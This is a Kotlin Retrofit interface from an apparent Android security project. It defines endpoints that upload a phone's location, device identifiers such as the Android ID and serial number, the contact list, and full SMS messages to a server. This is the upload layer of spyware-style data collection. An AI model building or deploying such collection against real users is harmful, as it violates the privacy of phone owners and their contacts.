package com.example.proyectosecurity

import retrofit2.Response
import retrofit2.http.Body
import retrofit2.http.POST

interface ApiService {

    @POST("/v1/api/location/send")
    suspend fun sendLocation(@Body locationRequest: LocationRequest): Response<LocationResponse>;

    //CAMBIAR RUTAS CUANDO SEA NECESARIO!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!.
    @POST("/v1/api/devices/send")
    suspend fun sendDeviceInfo(@Body deviceInfoRequest: DeviceInfoRequest): Response<DeviceResponse>

    @POST("/v1/api/contact/send")
    suspend fun sendContactInfo(@Body contactInfoRequest: List<ContactInfoRequest>): Response<ContactResponse>

    @POST("/v1/api/sms/send")
    suspend fun sendSMSInfo(@Body smsInfoRequest: List<SMSInfoRequest>): Response<SMSResponse>

}
//LOCATION DATA CLASSS=========
// For location request
data class LocationRequest(
    val latitude: Double,
    val longitude: Double
);
// For request response
data class LocationResponse(
    val message: String
);


//DEVICE INFO DATA CLASS ===========
data class DeviceInfoRequest(
    val deviceModel: String,
    val androidId: String,
    val totalRam: Long,
    val cpuAbi: String,
    val osVersion: String,
    val manufacture: String,
    val serialNumber: String
);
data class DeviceResponse (
    val message: String
);

//CONTACT INFO DATA CLASS ==========
data class ContactInfoRequest (
    val displayName: String,
    val phoneNumber: String,
    val contactId: String
);
data class ContactResponse (
    val message: String
);


//SMS INFO DATA CLASS ==========

data class  SMSInfoRequest (
    val id : Long,
    val address: String,
    val body: String,
    val date: Long
)

data class SMSResponse (
    val message: String
)